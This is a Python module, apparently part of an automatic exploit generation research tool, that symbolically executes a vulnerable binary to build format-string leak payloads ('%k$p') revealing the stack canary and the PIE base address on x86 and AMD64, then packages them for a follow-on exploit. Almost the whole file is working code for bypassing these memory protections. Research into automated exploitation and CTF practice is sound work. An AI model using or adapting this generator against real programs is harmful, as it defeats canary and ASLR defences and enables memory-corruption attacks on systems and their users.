"""
author : 4everdestiny
create_time : 2022.4.8
description : this is the code to generate format string payload
1. leak payload, %p format
2. maybe some arbitrary write payload
input : binary path
output : the exploit needed
"""

from log.log import Log
from exploit_generation.ProtectionInformation import ProtectionInformation
from exploit_generation.PayloadList import PayloadList
from exploit_generation.SinglePayload import SinglePayload
from exploit_generation.PayloadElement import PayloadElement
import re

log = Log()


class FMTGeneration:
    def __init__(self, binarypath):
        self.binarypath = binarypath
        self.payloadlist = PayloadList()
        self.untilrip = 0
        self.untileip = 0
        self.GetInformation()

    def GetInformation(self):
        """
        1. get the protection mechanism of this binary
        2. init the need information
        :return: None
        """
        self.protection = ProtectionInformation(self.binarypath).GetProtection()
        self.Canary = self.protection["Canary"]
        self.PIE = self.protection["PIE"]
        self.needcanary = self.Canary
        self.needelfbase = self.PIE
        self.needlibcbase = True

    def GetPayloadList(self):
        """
        return the payload list
        :return: payload list
        """
        return self.payloadlist

    def LeakPayloadGeneration(self, leakinfo=[], fmtstatelog=None):
        """
        according to the leakinfo to generate the payload of leak
        for example, if canary in leakinfo, we need to generate a leak canary payload
        :param leakinfo: a list of info you want to leak, for example, canary or elf_base
        :param fmtstatelog: the statelog of which has a format string vulnerability
        :return: True when success, False when fail
        """
        if fmtstatelog.state is None or fmtstatelog.project is None:
            log.Exception("state or project is None")
            return False
        if len(leakinfo) == 0:
            log.info("no need info given, use default settings")
        else:
            if "canary" in leakinfo:
                self.needcanary = True
            else:
                self.needcanary = False
            if "elf_base" in leakinfo:
                self.needelfbase = True
            else:
                self.needelfbase = False
            if "libc_base" in leakinfo:
                self.needlibcbase = True
            else:
                self.needlibcbase = False
        self.MainGenerateLeakPayload(fmtstatelog=fmtstatelog)
        return self.payloadlist

    def FindRange(self, fmtstatelog=None, needinfo="canary"):
        """
        use the needinfo and project to find the needed range of every needinfos
        :param fmtstatelog: the statelog of this format string vulnerability
        :param needinfo: canary, elf_base, or libc_base
        :return: if needinfo is canary, return the canary value
        if needinfo is elf_base of libc_base, return the range of these info
        """
        if needinfo == "canary":
            state = fmtstatelog.state
            copystate = state.copy()
            fs = copystate.solver.eval(copystate.regs.fs)
            if state.arch.name == "AMD64":
                original_canary = copystate.mem[fs + 0x28].uint64_t.resolved
                original_canary = copystate.solver.eval(original_canary)
            elif state.arch.name == "X86":
                find_canary, original_canary, offset = self.FindCanaryInStack(
                    fmtstatelog=fmtstatelog)
                original_canary = copystate.solver.eval(original_canary)
            else:
                original_canary = 0
                log.Exception("not supported architecture")
            return original_canary, original_canary
        elif needinfo == "elf_base":
            project = fmtstatelog.project
            min_addr = project.loader.main_object.min_addr
            max_addr = project.loader.main_object.max_addr
            return min_addr, max_addr
        elif needinfo == "libc_base":
            project = fmtstatelog.project
            for object in project.loader.all_objects:
                object_name = object.binary_basename
                match_object = re.match("libc-[\d.]+.so", object_name)
                if match_object:
                    min_addr = object.min_addr
                    max_addr = object.max_addr
                    return min_addr, max_addr
            log.Exception("cannot find libc, please check it, return two zero")
            return 0, 0
        return None

    def StopFunc(self, simgr):
        """
        the stop func of simgr
        :param simgr: the simgr of this running process
        :return: True when need stop(finish run printf), False when not need
        """
        if len(simgr.stashes["fmt_leak"]) == 0:
            log.Exception("deadended in leak using format string, please check it")
            exit(0)
        else:
            state = simgr.stashes["fmt_leak"][0]
            if state.arch.name == "AMD64":
                rip = state.solver.eval(state.regs.rip)
                if rip == self.untilrip:
                    return True
                else:
                    return False
            elif state.arch.name == "X86":
                eip = state.solver.eval(state.regs.eip)
                if eip == self.untileip:
                    return True
                else:
                    return False
        return False

    def ParseStatelogPath(self, fmtstatelog=None, payload_length=0):
        """
        solve the path problem in fmtstatelog
        we need to parse the information used in path
        :param fmtstatelog: the format string state log
        :param payload_length: the format string's payload length
        :return: None
        """
        if fmtstatelog is None:
            log.Exception("statelog is None, please check it")
        copystate = fmtstatelog.state.copy()
        project = fmtstatelog.project
        test_payload = "a" * (payload_length - 1) + "\x00"
        if copystate.arch.name == "X86":
            return_address = copystate.solver.eval(copystate.mem[copystate.regs.esp].uint32_t.resolved)
            self.untileip = return_address
            payload = test_payload
            par1 = copystate.mem[copystate.regs.esp + 4].uint32_t.resolved
            par1 = copystate.solver.eval(par1)
            constrained_parameter_address = par1
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = copystate.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                eip = copystate.solver.eval(copystate.regs.eip)
                stdoutput = resstate.posix.dumps(1)
                if test_payload.strip("\x00") in stdoutput.decode():
                    log.success("successfully get the payload, can parse the path info")
                else:
                    return None
            else:
                return None
        elif copystate.arch.name == "AMD64":
            return_address = copystate.solver.eval(copystate.mem[copystate.regs.rsp].uint64_t.resolved)
            self.untilrip = return_address
            rdi = copystate.solver.eval(copystate.regs.rdi)
            # make sure that there is a \x00 in the end of this string
            payload = test_payload
            constrained_parameter_address = rdi
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = copystate.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                start_index = 0
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                rip = copystate.solver.eval(copystate.regs.rip)
                stdoutput = resstate.posix.dumps(1)[start_index:]
                if test_payload.strip("\x00") in stdoutput.decode():
                    log.success("successfully get the payload, can parse the path info")
                else:
                    return None
            else:
                return None
        # we get the stdoutput from this state
        whole_input = copystate.posix.dumps(0)
        whole_output = stdoutput
        real_payload = b"a" * (payload_length - 1)
        pre_input = whole_input[:whole_input.index(real_payload)]
        output_info = whole_output[:whole_output.index(real_payload)]
        final_payload = []
        final_payload.append(PayloadElement(
            datavalue=pre_input, adjustinfo=None, datatype="bytes"
        ))
        singelpayload = SinglePayload(
            content=final_payload, length=len(pre_input),
            prefixlength=0
        )
        # if len(whole_output) != 0:
        #     singelpayload.AddRecvInfo(
        #         type="string", recv_index=[0, output_info], func="bytes", adjustoffset=None
        #     )
        self.payloadlist.AppendPayload(singelpayload)
        return whole_output, output_info

    def GetFinalLeakPayload_X86(self, needinfo="canary", fmtstatelog=None):
        """
        get the final leak payload using format string vulnerability
        :param needinfo: "canary" or "elf_base" or "libc_base"
        :param fmtstatelog: the statelog of the format string vulnerability
        :return: findpayload, finalpayload
        findpayload: if find, return True, if not, return False
        finalpayload: if find, return the final payload, if not, return ""
        """
        findpayload = False
        finalpayload = ""
        start_index = 0
        state = fmtstatelog.state
        project = fmtstatelog.project
        min_addr = 0
        max_addr = 0
        original_canary = 0
        adjustoffset = 0
        copystate = state.copy()
        if needinfo == "canary":
            original_canary, original_canary = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        elif needinfo == "elf_base":
            min_addr, max_addr = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        elif needinfo == "libc_base":
            min_addr, max_addr = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        return_address = state.solver.eval(state.mem[state.regs.esp].uint32_t.resolved)
        self.untileip = return_address
        log.info("return address:" + hex(self.untileip))
        if needinfo == "canary":
            # optimization
            # generally, the canary is stored in rbp - 8
            # some compiler may have error, just use the bruteforce method to find a
            # canary value in the stack
            canfind, original_canary, offset = self.FindCanaryInStack(fmtstatelog=fmtstatelog)
            esp = state.solver.eval(state.regs.esp)
            ebp = state.solver.eval(state.regs.ebp)
            canary_address = ebp + offset
            index = int(((canary_address) - (esp + 4)) / 0x4)
            # 6 for bypass the parameters of registers
            copystate = state.copy()
            par1 = state.mem[state.regs.esp + 4].uint32_t.resolved
            par1 = copystate.solver.eval(par1)
            # make sure that there is a \x00 in the end of this string
            payload = "%{k}$p\x00".format(k=index)
            constrained_parameter_address = par1
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                start_index = 0
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                eip = copystate.solver.eval(copystate.regs.eip)
                stdoutput = resstate.posix.dumps(1)[start_index:].decode()
                find_res = re.findall("0x[0-9a-f]+", stdoutput)
                real_info = find_res[-1]
                leak_address = int(real_info, 16)
                if original_canary != leak_address:
                    log.Exception("not expected leak info, check the payload")
                if leak_address == original_canary:
                    log.success("find leak canary payload:{payload}".format(payload=payload))
                    findpayload = True
                    finalpayload = payload.strip("\x00")
                    adjustoffset = 0
        elif needinfo == "elf_base":
            # optimization, generally, use the return address as the payload
            # for in different environment, the specific payload is not very useful
            # for every environment, so just use the return address for the leak payload
            esp = state.solver.eval(state.regs.esp)
            ebp = state.solver.eval(state.regs.ebp)
            # rbp + 8 is the return address of call function
            # rsp + 8 is the first parameter in stack
            # (not the first parameter of printf, rdi, rsi ,rdx, rcx, r8, r9)
            index = int(((ebp + 4) - (esp + 4)) / 0x4)
            need_leak_info = state.solver.eval(state.mem[state.regs.ebp + 4].uint32_t.resolved)
            # 6 for bypass the parameters of registers
            copystate = state.copy()
            par1 = state.mem[state.regs.esp + 4].uint32_t.resolved
            par1 = copystate.solver.eval(par1)
            # make sure that there is a \x00 in the end of this string
            payload = "%{k}$p\x00".format(k=index)
            constrained_parameter_address = par1
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                eip = copystate.solver.eval(copystate.regs.eip)
                stdoutput = resstate.posix.dumps(1)[start_index:].decode()
                find_res = re.findall("0x[0-9a-f]+",stdoutput)
                real_info = find_res[-1]
                leak_address = int(real_info, 16)
                if need_leak_info != leak_address:
                    log.Exception("not expected leak info, check the payload")
                if max_addr >= leak_address >= min_addr:
                    log.success("find leak elf_base payload:{payload}".format(payload=payload))
                    log.success("leak_address of return address:{address}".format(address=hex(leak_address)))
                    findpayload = True
                    finalpayload = payload.strip("\x00")
                    adjustoffset = min_addr - leak_address
        elif needinfo == "libc_base":
            pass
        return findpayload, finalpayload, start_index, adjustoffset

    def GetFinalLeakPayload_AMD64(self, needinfo="canary", fmtstatelog=None):
        """
        get the final leak payload using format string vulnerability
        :param needinfo: "canary" or "elf_base" or "libc_base"
        :param fmtstatelog: the statelog of the format string vulnerability
        :return: findpayload, finalpayload
        findpayload: if find, return True, if not, return False
        finalpayload: if find, return the final payload, if not, return ""
        """
        findpayload = False
        finalpayload = ""
        start_index = 0
        state = fmtstatelog.state
        project = fmtstatelog.project
        min_addr = 0
        max_addr = 0
        original_canary = 0
        adjustoffset = 0
        copystate = state.copy()
        if needinfo == "canary":
            original_canary, original_canary = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        elif needinfo == "elf_base":
            min_addr, max_addr = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        elif needinfo == "libc_base":
            min_addr, max_addr = self.FindRange(fmtstatelog=fmtstatelog, needinfo=needinfo)
        return_address = state.solver.eval(state.mem[state.regs.rsp].uint64_t.resolved)
        self.untilrip = return_address
        log.info("return address:" + hex(self.untilrip))
        if needinfo == "canary":
            # optimization
            # generally, the canary is stored in rbp - 8
            # some compiler may have error, just use the bruteforce method to find a
            # canary value in the stack
            rsp = state.solver.eval(state.regs.rsp)
            rbp = state.solver.eval(state.regs.rbp)
            # rsp + 8 is the first parameter in stack
            # (not the first parameter of printf, rdi, rsi ,rdx, rcx, r8, r9)
            # first, we need to check the canary value in the stack
            stack_canary = state.solver.eval(state.mem[state.regs.rbp - 8].uint64_t.resolved)
            final_address = 0
            if stack_canary == original_canary:
                log.info("stable compiler, canary value is in rbp - 8")
                final_address = rbp - 8
            else:
                # if in this branch, it means the compiler is not stable
                # or this function doesn't have canary protection
                # the payload is not stable, pay attention to this
                log.info("canary is not in rbp - 8, pay attention to this")
                max_deep = 0x200
                for address in range(rsp + 8, rsp + 8 + max_deep):
                    stack_value = state.solver.eval(state.mem[address].uint64_t.resolved)
                    if stack_value == original_canary:
                        log.info("find a canary value in the stack")
                        final_address = address
                        break
            if final_address == 0:
                log.Exception("cannot find canary value in the stack, please check it")
                return findpayload, finalpayload, start_index, adjustoffset
            index = int(((final_address) - (rsp + 8)) / 0x8 + 6)
            # 6 for bypass the parameters of registers
            copystate = state.copy()
            rdi = copystate.solver.eval(copystate.regs.rdi)
            # make sure that there is a \x00 in the end of this string
            payload = "%{k}$p\x00".format(k=index)
            constrained_parameter_address = rdi
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                start_index = 0
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                rip = copystate.solver.eval(copystate.regs.rip)
                stdoutput = resstate.posix.dumps(1)[start_index:].decode()
                find_res = re.findall("0x[0-9a-f]+", stdoutput)
                real_info = find_res[-1]
                leak_address = int(real_info, 16)
                if original_canary != leak_address:
                    log.Exception("not expected leak info, check the payload")
                if leak_address == original_canary:
                    log.success("find leak canary payload:{payload}".format(payload=payload))
                    findpayload = True
                    finalpayload = payload.strip("\x00")
                    adjustoffset = 0
        elif needinfo == "elf_base":
            # optimization, generally, use the return address as the payload
            # for in different environment, the specific payload is not very useful
            # for every environment, so just use the return address for the leak payload
            rsp = state.solver.eval(state.regs.rsp)
            rbp = state.solver.eval(state.regs.rbp)
            # rbp + 8 is the return address of call function
            # rsp + 8 is the first parameter in stack
            # (not the first parameter of printf, rdi, rsi ,rdx, rcx, r8, r9)
            index = int(((rbp + 8) - (rsp + 8)) / 0x8 + 6)
            need_leak_info = state.solver.eval(state.mem[state.regs.rbp + 8].uint64_t.resolved)
            # 6 for bypass the parameters of registers
            copystate = state.copy()
            rdi = copystate.solver.eval(copystate.regs.rdi)
            # make sure that there is a \x00 in the end of this string
            payload = "%{k}$p\x00".format(k=index)
            constrained_parameter_address = rdi
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = project.factory.simgr(copystate)
                copysimgr.stashes["fmt_leak"] = [copystate]
                # start_index = len(copystate.posix.dumps(1))
                # generally, use 0 for the start_index
                # other program will solve the problem about the index
                res = copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                resstate = copysimgr.stashes["fmt_leak"][0]
                rip = copystate.solver.eval(copystate.regs.rip)
                stdoutput = resstate.posix.dumps(1)[start_index:].decode()
                find_res = re.findall("0x[0-9a-f]+",stdoutput)
                real_info = find_res[-1]
                leak_address = int(real_info, 16)
                if need_leak_info != leak_address:
                    log.Exception("not expected leak info, check the payload")
                if max_addr >= leak_address >= min_addr:
                    log.success("find leak elf_base payload:{payload}".format(payload=payload))
                    log.success("leak_address of return address:{address}".format(address=hex(leak_address)))
                    findpayload = True
                    finalpayload = payload.strip("\x00")
                    adjustoffset = min_addr - leak_address
        elif needinfo == "libc_base":
            pass
        return findpayload, finalpayload, start_index, adjustoffset

    def SingleLeakPayloadGenerate(self, needinfo="canary", fmtstatelog=None):
        """
        according to the needinfo, generate the final leak payload
        :param needinfo: "canary" or "elf_base" or "libc_base"
        :param fmtstatelog: the statelog of the format string vulnerability
        :return: True when success, False when failed
        """
        if fmtstatelog.state is None or fmtstatelog.project is None:
            log.Exception("need state and project")
        if fmtstatelog.state.arch.name == "AMD64":
            return self.GetFinalLeakPayload_AMD64(needinfo=needinfo, fmtstatelog=fmtstatelog)
        elif fmtstatelog.state.arch.name == "X86":
            return self.GetFinalLeakPayload_X86(needinfo=needinfo, fmtstatelog=fmtstatelog)
        else:
            return None

    def GetFMTPayloadLength(self, fmtstatelog=None):
        """
        get the format string payload's max length
        :param fmtstatelog: the state log of format string
        :return: the max length of format string payload
        """
        state = fmtstatelog.state
        max_length = 0x100
        for length in range(4, 0x100, 0x4):
            copystate = state.copy()
            if copystate.arch.name == "AMD64":
                par1 = copystate.solver.eval(copystate.regs.rdi)
            elif copystate.arch.name == "X86":
                par1 = state.mem[state.regs.esp + 4].int32_t.resolved
                par1 = copystate.solver.eval(par1)
            # make sure that there is a \x00 in the end of this string
            payload = b"a" * (length - 1) + b"\x00"
            constrained_parameter_address = par1
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                stdoutput = copystate.posix.dumps(0)
                test_payload = b"a" * (length - 1)
                if test_payload not in stdoutput:
                    max_length = length - 4
                    break
                else:
                    continue
            else:
                max_length = length - 4
                break
        return max_length

    def FindCanaryInStack(self, fmtstatelog=None):
        """
        find the canary in stack, because the canary in x86 cannot use the fs + 0x14
        to locate
        :param fmtstatelog: the state log of the format string
        :return: whether find, canary value, and offset to ebp
        """
        state = fmtstatelog.state
        function_address = state.callstack.current_function_address
        log.info("function_address:" + hex(function_address))
        project = fmtstatelog.project
        block = project.factory.block(function_address)
        code = block.disassembly.__str__()
        for _ in range(0x20):
            if state.arch.name == "X86":
                if "gs" not in code:
                    function_address += block.size
                    block = project.factory.block(function_address)
                    code = block.disassembly.__str__()
                    continue
                else:
                    break
            elif state.arch.name == "AMD64":
                if "fs" not in code:
                    function_address += block.size
                    block = project.factory.block(function_address)
                    code = block.disassembly.__str__()
                    continue
                else:
                    break
        code_lines = code.split("\n")
        line2 = ""
        for index in range(len(code_lines)):
            line = code_lines[index]
            if "gs" in line:
                log.info("find gs register in the line: {instruction}".format(instruction=line))
                line2 = code_lines[index + 1]
                log.info("find the offset in this line: {instruction}".format(instruction=line2))
                break
        if line2 == "":
            log.Exception("cannot find instructions")
            return False, None, 0
        #0x804864f:\tmov\tdword ptr [ebp - 0xc], eax
        offset = re.findall("0x[a-f0-9]+", line2)
        offset = -int(offset[1], 16)
        log.success("find offset:" + str(offset))
        if state.arch.name == "X86":
            original_canary = state.mem[state.regs.ebp + offset].uint32_t.resolved
            original_canary = state.solver.eval(original_canary)
            return True, original_canary, offset
        elif state.arch.name == "AMD64":
            original_canary = state.mem[state.regs.rbp + offset].uint64_t.resolved
            original_canary = state.solver.eval(original_canary)
            return True, original_canary, offset
        return False, None, 0

    def AvoidFMTErrorUsingPayload(self, fmtstatelog=None, final_payload=b""):
        """
        for we need this fmtstatelog in later run, so we need to set
        the rdi's value to a specific string, here we just use the final payload
        generated
        :param fmtstatelog: the state log of the format string
        :param final_payload: the final_payload generated
        :return: True when set successfully, False when failed
        """
        if fmtstatelog.state.arch.name == "X86":
            state = fmtstatelog.state
            return_address = state.solver.eval(state.mem[state.regs.esp].uint32_t.resolved)
            self.untileip = return_address
            par1 = state.mem[state.regs.esp + 4].uint32_t.resolved
            par1 = state.solver.eval(par1)
            # make sure that there is a \x00 in the end of this string
            payload = final_payload
            constrained_parameter_address = par1
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            state.add_constraints(constraint_expression)
            if state.satisfiable():
                project = fmtstatelog.project
                copysimgr = project.factory.simgr(state)
                copysimgr.stashes["fmt_leak"] = [state]
                copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                if len(copysimgr.stashes["fmt_leak"]) == 1:
                    fmtstatelog.state = copysimgr.stashes["fmt_leak"][0]
                return True
            else:
                return False
        elif fmtstatelog.state.arch.name == "AMD64":
            state = fmtstatelog.state
            return_address = state.solver.eval(state.mem[state.regs.rsp].uint64_t.resolved)
            self.untilrip = return_address
            rdi = state.solver.eval(state.regs.rdi)
            # make sure that there is a \x00 in the end of this string
            payload = final_payload
            constrained_parameter_address = rdi
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            state.add_constraints(constraint_expression)
            if state.satisfiable():
                project = fmtstatelog.project
                copysimgr = project.factory.simgr(state)
                copysimgr.stashes["fmt_leak"] = [state]
                copysimgr.run(stash="fmt_leak", until=self.StopFunc)
                if len(copysimgr.stashes["fmt_leak"]) == 1:
                    fmtstatelog.state = copysimgr.stashes["fmt_leak"][0]
                return True
            else:
                return False

    def MainGenerateLeakPayload(self, fmtstatelog=None):
        """
        try to use the information to generate the leak payload
        :param fmtstatelog: the statelog of the format string vulnerability
        :return: None, add the payload into the payloadlist
        """
        payload_length = self.GetFMTPayloadLength(fmtstatelog=fmtstatelog)
        log.info("real max payload length:{length}".format(length=hex(payload_length)))
        whole_output, output_info = self.ParseStatelogPath(fmtstatelog=fmtstatelog, payload_length=payload_length)
        if self.needcanary:
            canary_findpayload, canary_finalpayload, \
            canary_start_index, canary_adjustoffset, \
                = self.SingleLeakPayloadGenerate(
                needinfo="canary", fmtstatelog=fmtstatelog
            )
            if canary_findpayload:
                log.info("successfully find leak canary payload: {payload}".format(payload=canary_finalpayload))
            else:
                log.Exception("cannot find canary payload")
                return False
        if self.needelfbase:
            elfbase_findpayload, elfbase_finalpayload, \
            elfbase_start_index, elfbase_adjustoffset, \
                = self.SingleLeakPayloadGenerate(
                needinfo="elf_base", fmtstatelog=fmtstatelog
            )
            if elfbase_findpayload:
                log.info("successfully find leak elf_base payload: {payload}".format(payload=elfbase_finalpayload))
            else:
                log.Exception("cannot find leak elf_base payload")
                return False
        if self.needlibcbase:
            # need another algorithm
            pass
            """
            self.SingleLeakPayloadGenerate(
                needinfo="libc_base", fmtstatelog=fmtstatelog
            )
            """
        final_payload_content = b""
        """
        content: str = "",
        length: int = 0x10,
        needline: bool = False,
        avoidchars: bytes = b"\n",
        needadjust: bool = False,
        prefixlength: int = 0
        """
        singlepayload = SinglePayload(
            content="", length=0, needline=False,
            avoidchars=b"", prefixlength=0
        )
        if len(whole_output) != 0:
            singlepayload.AddRecvInfo(
                type="string", recv_index=[0, output_info], func="bytes", adjustoffset=None
            )
        if self.needcanary:
            if canary_findpayload:
                final_payload_content += canary_finalpayload.encode()
                final_payload_content += b"\n"
                singlepayload.AddRecvInfo(
                    type="canary",
                    recv_index=[canary_start_index, b"\n"],
                    func="int16",
                    adjustoffset=canary_adjustoffset
                )
            else:
                log.Exception("cannot generate find canary payload")
                return False
        if self.needelfbase:
            if elfbase_findpayload:
                final_payload_content += elfbase_finalpayload.encode()
                final_payload_content += b"\n"
                singlepayload.AddRecvInfo(
                    type="elf_base",
                    recv_index=[elfbase_start_index, b"\n"],
                    func="int16",
                    adjustoffset=elfbase_adjustoffset
                )
            else:
                log.Exception("cannot generate find elf_base payload")
                return False
        final_payload_content += b"\x00"
        final_payload_element = PayloadElement(
            datavalue=final_payload_content, adjustinfo=None, datatype="bytes"
        )
        final_payload = []
        final_payload.append(final_payload_element)
        singlepayload.SetContent(
            content=final_payload, change_length=True
        )
        self.payloadlist.AppendPayload(singlepayload)
        self.AvoidFMTErrorUsingPayload(
            fmtstatelog=fmtstatelog, final_payload=final_payload_content)


if __name__ == "__main__":
    binarypath = "../binaries/formatstring_stackoverflow/fmt_stack_canary_PIE/fmt_stack_canary_PIE"
    fmtgeneration = FMTGeneration(binarypath=binarypath)